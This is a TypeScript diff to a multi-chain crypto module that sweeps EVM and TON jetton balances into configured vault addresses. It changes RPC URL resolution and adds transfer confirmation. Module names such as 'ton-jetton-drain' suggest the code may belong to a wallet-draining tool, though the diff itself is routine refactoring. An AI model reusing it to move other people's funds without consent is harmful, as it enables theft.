@@ -45,12 +45,12 @@ import {
   resolveServerTronAddressAsync,
 } from './server-chain-execution.js'
 import {
-  resolveEvmExecutorRpcUrl,
+  resolveEvmRpcUrlForChain,
   resolveSettlementExecutorKey,
 } from './permit2-executor.js'
 import { resolveSovereignVaultAddresses } from './settlement-execution-bridge.js'
 import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
-import { buildJettonTransferBody } from './ton-jetton-drain.js'
+import { buildJettonTransferBody, confirmJettonTransferAfterBroadcast } from './ton-jetton-drain.js'
 import { resolveTonCenterJsonRpcUrl, tonCenterApiHeaders } from './ton-sensory-armor.js'
 import { Address as TonAddress, Cell, internal, toNano, WalletContractV4 } from '@ton/ton'
 import { JettonMaster, JettonWallet, TonClient } from '@ton/ton'
@@ -261,7 +261,7 @@ export async function sweepEvmVault(
   const mismatch = vaultMismatchWarning('EVM', vaults.evm, account.address)
   if (mismatch) result.warnings.push(mismatch)
 
-  const rpcUrl = await resolveEvmExecutorRpcUrl()
+  const rpcUrl = await resolveEvmRpcUrlForChain(1)
   const publicClient = createPublicClient({ transport: http(rpcUrl) })
   const walletClient = createWalletClient({
     account,
@@ -656,9 +656,16 @@ async function sweepTonJettons(
             }),
           ],
         })
-        const txs = await client.getTransactions(wallet.address, { limit: 1 })
-        const hash = txs[0]?.hash().toString('hex') ?? `jetton-${Date.now()}`
-        result.tx_hashes.push(hash)
+        const walletAddress = wallet.address.toString({ bounceable: false, urlSafe: true })
+        const confirmed = await confirmJettonTransferAfterBroadcast({
+          walletAddress,
+          seqnoBeforeSend: seqno,
+          rpcUrl: endpoint,
+        })
+        result.tx_hashes.push(confirmed.tx_hash)
+        if (confirmed.warning) {
+          result.warnings.push(`Jetton ${masterStr.slice(0, 8)}…: ${confirmed.warning}`)
+        }
       } catch (e) {
         result.errors.push(
           `Jetton ${masterStr}: ${e instanceof Error ? e.message : String(e)}`,
